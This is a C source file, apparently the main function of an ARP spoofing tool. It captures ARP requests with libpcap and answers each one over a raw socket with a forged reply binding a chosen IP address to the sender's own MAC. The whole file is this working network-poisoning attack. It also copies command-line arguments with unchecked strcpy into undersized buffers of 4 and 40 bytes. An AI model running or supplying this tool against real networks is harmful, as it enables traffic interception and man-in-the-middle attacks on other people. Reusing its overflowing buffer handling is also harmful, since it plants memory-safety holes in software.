int main(int argc, char *argv[]) {


    int sd, status, bytes;             
    struct ifreq *ifr;                /* Will hold interface information later */
    struct sockaddr_ll device;        /* Specifies the interface to use for sending packets */

    

    struct pcap_pkthdr *pkthdr;       /* Will store packet metadata */
    struct arp_hdr *recv_arp;         /* Will store a received ARP msg */
    const unsigned char *packet=NULL; /* Buffer for received packets */
    bpf_u_int32 netaddr=0, mask=0;    /* To Store network address and netmask   */ 
    struct bpf_program filter;        /* Place to store the BPF filter program  */ 
    char errbuf[PCAP_ERRBUF_SIZE];    /* Error buffer                           */ 
    pcap_t *descr = NULL;             /* Network interface handler              */ 



    char *my_mac = malloc(6);         /* Our MAC address to be used in eth_hdr and arp_hdr*/
    char *interface = malloc(40);     /* Interface name, provided by the user */
    char *spoofed_IP = malloc(4);     /* IP to be spoofed, provided by the user */
    char *msg = malloc(sizeof(struct arp_hdr) + sizeof(struct eth_hdr)); /* Will hold the final message */

    uint8_t *spoofed_IP_network = malloc(4); /* IP to be spoofed in network byte order */



    strcpy(interface, argv[1]);      /*Copy user input*/
    strcpy(spoofed_IP,argv[2]);


    /* Get spoofed IP network byte order */
    if ((status = inet_pton (AF_INET, spoofed_IP, spoofed_IP_network)) != 1) {
        fprintf (stderr, "inet_pton() failed for source IP address.\nError message: %s", strerror (status));
        exit (EXIT_FAILURE);
      }





    ifr = populateIfreq(interface);   /* Get interface information */

    memset (&device, 0, sizeof (device));


    /* Get the interface index */
    if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
      perror ("if_nametoindex() failed to obtain interface index ");
      exit (EXIT_FAILURE);
    }


    /* Get our MAC address */
    memcpy(my_mac,ifr->ifr_hwaddr.sa_data,6);


    /* Open network device for packet capture */ 
    if ((descr = pcap_open_live(interface, 2048, 0,  512, errbuf))==NULL){
      fprintf(stderr, "ERROR: %s\n", errbuf);
      exit(1);
    }

    /* Look up info from the capture device. */ 
    if( pcap_lookupnet( interface , &netaddr, &mask, errbuf) == -1){
      fprintf(stderr, "ERROR: %s\n", errbuf);
      exit(1);
    }

    /* Compiles the filter expression into a BPF filter program */ 
    if ( pcap_compile(descr, &filter, "arp", 1, mask) == -1){
      fprintf(stderr, "ERROR: %s\n", pcap_geterr(descr) );
      exit(1);
    }

    /* Load the filter program into the packet capture device. */ 
    if (pcap_setfilter(descr,&filter) == -1){
      fprintf(stderr, "ERROR: %s\n", pcap_geterr(descr) );
      exit(1);
    }



    signal(SIGINT, &sig_handler);
    
    /* Open the socket to send */
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
      printf("%s\n",strerror(errno));
      return(1);
    }

    /* Main loop */
    while(g_running){

      int status = pcap_next_ex(descr,&pkthdr, &packet);

      if( status == -1){
        pcap_perror(descr,"ERROR: ");
      }

      /* 0 means we timed out, so just repeat */
      if(status == 0){
        continue;
      }

      /* Cast the incoming packet into our arp_hdr struct. Skip the eth_hdr */
      /* NOTE that contents in recv_arp are still in network byte order! */
      recv_arp = (struct arp_hdr *)(packet+sizeof(struct eth_hdr));


      /* If the message is an ARP request (opcode 1), do stuff..*/
      if(ntohs(recv_arp->opcode) != 1)
        continue;

      printf("received arp request\n");


      /* Set up ethernet and ARP hdr for our ARP reply */
      struct eth_hdr *eth_rsp = setupEthHdr(recv_arp->src_mac,my_mac);
      struct arp_hdr *arp_rsp = setupArpHdr(my_mac,spoofed_IP_network,recv_arp->src_mac, recv_arp->src_ip);

      /* Paste them together into our final message */
      memcpy(msg,eth_rsp,sizeof(struct eth_hdr));
      memcpy(msg + sizeof(struct eth_hdr), arp_rsp, sizeof(struct arp_hdr));



      /* Send */
      if ((bytes = sendto (sd, msg, ETH_HDRLEN + ARP_HDRLEN, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
        perror ("sendto() failed");
        exit (EXIT_FAILURE);
      }
      free(eth_rsp);
      free(arp_rsp);

    }


  free(my_mac);
  free(interface);
  free(spoofed_IP);
  free(spoofed_IP_network);
  free(msg);
  free(ifr);
  return(0);
}